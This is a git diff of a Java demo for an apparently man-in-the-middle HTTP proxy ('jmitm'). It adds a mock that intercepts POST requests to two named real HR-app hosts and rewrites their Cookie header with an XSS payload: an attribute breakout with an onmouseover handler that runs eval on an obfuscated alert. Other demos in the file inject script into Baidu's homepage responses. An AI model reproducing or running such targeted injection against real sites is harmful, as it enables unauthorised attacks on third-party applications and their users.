@@ -11,9 +11,6 @@ import org.hum.jmitm.proxy.mock.CatchResponse;
 import org.hum.jmitm.proxy.mock.Mock;
 import org.hum.jmitm.proxy.mock.wiredog.HttpResponse;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-
 import io.netty.handler.codec.http.HttpMethod;
 import lombok.extern.slf4j.Slf4j;
 
@@ -28,18 +25,30 @@ public class JmitmServerRun {
 		wtBuilder.pipeHistory(10).sessionHistory(200);
 		wtBuilder.addMock(
 				// DEMO1：将「wiredog.com」重定向到「localhost:8080」，等效于配置host:   wiredog.com    127.0.0.1:8080
-				mockDemo1(), 
+				mockDemo1() 
 				// DEMO2：修改了百度首页的Logo，读取本地GoogleLogo文件，首页Logo变为Google
-				mockDemo2(), 
+				,mockDemo2() 
 				// DEMO3：拦截所有响应，对响应打标记
-				mockDemo3(),
+				,mockDemo3()
 				// DEMO4：对百度首页注入一段JS代码（根据请求拦截响应报文，并追加一段代码）
-				mockDemo4()
+				, mockDemo4()
+				, mockDemo11()
 				);
 		
 		wtBuilder.build().start();
 	}
 
+	
+	private static Mock mockDemo11() {
+		return new CatchRequest().eval(request -> {
+			return ("hrapp2.avaryholding.com".equals(request.host()) || "hrapp3.avaryholding.com".equals(request.host())) &&
+					("/".equals(request.uri())) && request.method().equals(HttpMethod.POST);
+		}).rebuildRequest(request -> {
+			request.header("Cookie", "app-account=User Im\"onmouseover=\"eval(/ale/.source+/rt/.source+/(862)/.source)\"");
+			return request;
+		}).mock();
+	}
+	
 	private static Mock mockDemo4() {
 		return new CatchRequest().eval(request -> {
 			// PC版首页注入
@@ -51,7 +60,7 @@ public class JmitmServerRun {
 		}).rebuildResponse(response -> {
 			log.info("inject js...");
 			// 注入的JS代码
-			String json = "<!--add by wiretigher--><script type='text/javascript'>alert('wiredog say hello');</script>";
+			String json = "<!--add by wiretigher--><script type='text/javascript'>alert('jmitm say hello');</script>";
 			String outBody = "";
 			try {
 				// 因为响应头是gzip进行压缩，因此无法直接将ASCII串追加到内容末尾，需要先将原响应报文解压，在将JS追加到末尾
@@ -85,7 +94,8 @@ public class JmitmServerRun {
 	
 	private static byte[] readFile(String file) {
 		try {
-			FileInputStream fileInputStream = new FileInputStream(new File(JmitmServerRun.class.getResource(file).getFile()));
+//			FileInputStream fileInputStream = new FileInputStream(new File(JmitmServerRun.class.getResource(file).getFile()));
+			FileInputStream fileInputStream = new FileInputStream(new File("/Users/hudaming/Workspace/GitHub/jmitm/jmitm-start/src/main/resources/" + file));
 			byte[] bytes = new byte[fileInputStream.available()];
 			fileInputStream.read(bytes);
 			fileInputStream.close();
